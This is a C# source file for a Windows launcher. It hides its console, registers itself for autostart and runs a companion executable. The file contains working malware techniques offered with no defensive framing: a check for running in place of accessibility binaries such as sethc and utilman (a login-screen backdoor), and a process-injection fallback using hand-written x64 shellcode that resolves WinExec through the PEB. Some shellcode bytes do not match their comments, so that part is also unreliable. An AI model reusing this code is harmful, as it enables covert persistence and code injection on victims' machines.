using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace cjh
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        static void Main(string[] args)
        {
            FreeConsole();

            string cjhPath = Process.GetCurrentProcess().MainModule!.FileName;
            string? cjhDir = Path.GetDirectoryName(cjhPath);

            string naiwaPath = FindNaiwaPath(cjhDir, cjhPath);

            AutoStartService autoStart = new AutoStartService();
            autoStart.RegisterAutoStart(IsElevated());

            LaunchNaiwa(naiwaPath);

            Environment.Exit(0);
        }

        static string FindNaiwaPath(string? cjhDir, string cjhPath)
        {
            string[] searchPaths = new string[]
            {
                Path.Combine(cjhDir ?? "", "naiwa.exe"),
                Path.Combine(cjhDir ?? "", "..", "naiwa.exe"),
                Path.Combine(cjhDir ?? "", "..", "naiwa", "naiwa.exe"),
                Path.Combine(cjhDir ?? "", "..", "naiwa", "bin", "Debug", "net8.0-windows", "naiwa.exe"),
                Path.Combine(cjhDir ?? "", "..", "naiwa", "bin", "Release", "net8.0-windows", "naiwa.exe"),
                Path.Combine(cjhDir ?? "", "..", "naiwa", "bin", "Release", "net8.0-windows", "win-x64", "naiwa.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "..", "naiwa.exe"),
            };

            foreach (string path in searchPaths)
            {
                string fullPath = Path.GetFullPath(path);
                if (File.Exists(fullPath))
                {
                    return fullPath;
                }
            }

            string exeName = Path.GetFileNameWithoutExtension(cjhPath);
            if (exeName.Equals("sethc", StringComparison.OrdinalIgnoreCase) ||
                exeName.Equals("utilman", StringComparison.OrdinalIgnoreCase) ||
                exeName.Equals("magnify", StringComparison.OrdinalIgnoreCase) ||
                exeName.Equals("narrator", StringComparison.OrdinalIgnoreCase) ||
                exeName.Equals("osk", StringComparison.OrdinalIgnoreCase) ||
                exeName.Equals("DisplaySwitch", StringComparison.OrdinalIgnoreCase))
            {
                string sys32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string[] fallbackPaths = new string[]
                {
                    Path.Combine(sys32Path, "..", "naiwa.exe"),
                    Path.Combine(sys32Path, "..", "cjh", "naiwa.exe"),
                    @"C:\naiwa.exe",
                    @"D:\naiwa.exe",
                };

                foreach (string path in fallbackPaths)
                {
                    if (File.Exists(path))
                    {
                        return path;
                    }
                }
            }

            return Path.Combine(cjhDir ?? "", "naiwa.exe");
        }

        static void LaunchNaiwa(string naiwaPath)
        {
            if (!File.Exists(naiwaPath))
            {
                return;
            }

            try
            {
                using var process = new Process();
                process.StartInfo.FileName = naiwaPath;
                process.StartInfo.UseShellExecute = true;
                process.StartInfo.CreateNoWindow = false;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
                process.Start();
                return;
            }
            catch
            {
            }

            try
            {
                DirtyVanityInjector injector = new DirtyVanityInjector();
                int targetPid = injector.GetTargetProcessId();

                if (targetPid > 0)
                {
                    byte[] shellcode = GenerateSimpleShellcode(naiwaPath);

                    bool success = injector.Inject(targetPid, shellcode);
                    if (success)
                    {
                        return;
                    }
                }
            }
            catch
            {
            }

            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = naiwaPath,
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
            }
            catch
            {
            }
        }

        static bool IsElevated()
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }

        static byte[] GenerateSimpleShellcode(string exePath)
        {
            byte[] pathBytes = System.Text.Encoding.Unicode.GetBytes(exePath + "\0");

            byte[] code = new byte[]
            {
                0xE8, 0x00, 0x00, 0x00, 0x00, // call $+5
                0x5F,                         // pop rdi
                0x48, 0x81, 0xC7, 0x00, 0x00, 0x00, 0x00, // add rdi, imm32 (fixup)
                0x48, 0x31, 0xC9,             // xor rcx, rcx
                0x65, 0x48, 0x8B, 0x41, 0x60, // mov rax, gs:[rcx+0x60] -> PEB
                0x48, 0x8B, 0x40, 0x18,       // mov rax, [rax+0x18] -> Ldr
                0x48, 0x8B, 0x40, 0x20,       // mov rax, [rax+0x20] -> InMemOrderModList.Flink
                0x48, 0x8B, 0x00,             // mov rax, [rax] -> ntdll
                0x48, 0x8B, 0x00,             // mov rax, [rax] -> kernel32
                0x48, 0x8B, 0x58, 0x20,       // mov rbx, [rax+0x20] -> kernel32 DllBase
                0x8B, 0x43, 0x3C,             // mov eax, [rbx+0x3C] -> e_lfanew
                0x48, 0x89, 0xDE,             // mov rsi, rbx
                0x48, 0x01, 0xC6,             // add rsi, rax -> PE header
                0x4C, 0x8B, 0x86, 0x88, 0x00, 0x00, 0x00, // mov r8d, [rsi+0x88] -> ExportDir RVA
                0x49, 0x85, 0xC0,             // test r8d, r8d
                0x74, 0x64,                   // jz failed
                0x4D, 0x01, 0xD8,             // add r8, rbx -> ExportDir VA
                0x4D, 0x8B, 0x48, 0x20,       // mov r9d, [r8+0x20] -> AddressOfNames RVA
                0x4D, 0x01, 0xD9,             // add r9, rbx -> AddressOfNames VA
                0x4D, 0x8B, 0x50, 0x24,       // mov r10d, [r8+0x24] -> AddressOfNameOrdinals RVA
                0x4D, 0x01, 0xDA,             // add r10, rbx -> AddressOfNameOrdinals VA
                0x4D, 0x8B, 0x58, 0x1C,       // mov r11d, [r8+0x1C] -> AddressOfFunctions RVA
                0x4D, 0x01, 0xDB,             // add r11, rbx -> AddressOfFunctions VA
                0x4D, 0x8B, 0x60, 0x18,       // mov r12d, [r8+0x18] -> NumberOfNames
                0x4D, 0x31, 0xED,             // xor r13d, r13d (i = 0)
                0x4D, 0x39, 0xE5,             // cmp r13d, r12d
                0x7D, 0x40,                   // jge failed
                0x4F, 0x8B, 0x34, 0xA9,       // mov r14d, [r9+r13*4] -> name RVA
                0x4D, 0x01, 0xDE,             // add r14, rbx -> name VA
                0x41, 0x8B, 0x06,             // mov eax, [r14]
                0x3D, 0x57, 0x69, 0x6E, 0x45, // cmp eax, "WinE"
                0x75, 0x2A,                   // jne next
                0x41, 0x8B, 0x46, 0x04,       // mov eax, [r14+4]
                0x3D, 0x78, 0x65, 0x63, 0x00, // cmp eax, "xec\0"
                0x75, 0x1F,                   // jne next
                0x4F, 0x0F, 0xB7, 0x3C, 0x6A, // movzx r15d, word [r10+r13*2] -> ordinal
                0x4B, 0x8B, 0x04, 0xBB,       // mov eax, [r11+r15*4] -> func RVA
                0x48, 0x01, 0xD8,             // add rax, rbx -> func VA
                0x48, 0x89, 0xF9,             // mov rcx, rdi (path)
                0xBA, 0x05, 0x00, 0x00, 0x00, // mov edx, 5 (SW_SHOW)
                0x48, 0x83, 0xEC, 0x28,       // sub rsp, 0x28 (shadow space + align)
                0xFF, 0xD0,                   // call rax (WinExec)
                0x48, 0x83, 0xC4, 0x28,       // add rsp, 0x28
                0xC3,                         // ret
                0x41, 0xFF, 0xC5,             // inc r13d
                0xEB, 0xBB,                   // jmp loop_start
                0x48, 0x31, 0xC0,             // xor rax, rax
                0x48, 0xFF, 0xC0,             // inc rax
                0xC3,                         // ret
            };

            int offset = code.Length - 5;
            Buffer.BlockCopy(BitConverter.GetBytes(offset), 0, code, 9, 4);

            byte[] result = new byte[code.Length + pathBytes.Length];
            Buffer.BlockCopy(code, 0, result, 0, code.Length);
            Buffer.BlockCopy(pathBytes, 0, result, code.Length, pathBytes.Length);

            return result;
        }
    }
}